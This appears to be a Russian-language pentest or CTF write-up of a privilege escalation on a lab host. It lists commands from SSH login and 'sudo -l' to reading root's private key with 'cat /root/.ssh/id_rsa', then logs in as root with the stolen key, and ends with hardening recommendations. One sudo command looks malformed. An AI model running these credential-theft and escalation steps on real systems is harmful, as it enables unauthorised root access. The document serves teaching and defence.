Дата: 28 января 2026
Исполнитель: Jack
Выполненные действия

Получение начального доступа
Установлено SSH-соединение с удалённым сервером под учётной записью user1:
ssh user1@83.136.249.34 -p 32202

Анализ привилегий
Выполнена проверка доступных sudo-прав:
sudo -l
Обнаружено право выполнять команду sudo user2 -i без пароля.

Эскалация привилегий до user2
Выполнен вход в интерактивную оболочку от имени user2:
sudo user2 -i

Получение приватного SSH-ключа root
Прочитан приватный ключ root-пользователя:
cat /root/.ssh/id_rsa
(Альтернативный путь, если доступ к /root ограничен: чтение ключа из домашней директории другого пользователя — /home/user/.ssh/id_rsa).

Подготовка ключа на атакующей машине
Создан файл с приватным ключом:
nano stolen_id_rsa (вставлен скопированный ключ)
Установлены корректные права доступа (обязательное требование ssh-клиента):
chmod 600 stolen_id_rsa

Получение полного доступа к системе (root)
Выполнено успешное подключение по SSH от имени root с использованием украденного ключа:
ssh -i stolen_id_rsa root@83.136.249.34 -p 32202


Результат
Получен неограниченный доступ к системе от имени root-пользователя.
Рекомендации по устранению уязвимостей

Отключить или ограничить sudo-право sudo user2 -i без пароля (NOPASSWD) для user1.
Рекомендуется: полностью убрать или требовать пароль.
Запретить чтение приватных SSH-ключей других пользователей (в т.ч. root) из-под учётных записей с низкими привилегиями.
Рекомендуемые меры:
Права на директорию ~/.ssh должны быть 700, на id_rsa — 600, владелец — только соответствующий пользователь.
Использовать AppArmor / SELinux для ограничения доступа к /root/.ssh.

Отключить аутентификацию по паролю и разрешить только ключи (PasswordAuthentication no в /etc/ssh/sshd_config).
Использовать принцип наименьших привилегий: не хранить приватные ключи root на серверах, где есть обычные пользователи с sudo-доступом.
Внедрить мониторинг и аудит команд sudo (sudoers + auditd / Wazuh / OSSEC).
Рассмотреть переход на более жёсткую модель управления доступом (например, Jump host + bastion + MFA на SSH).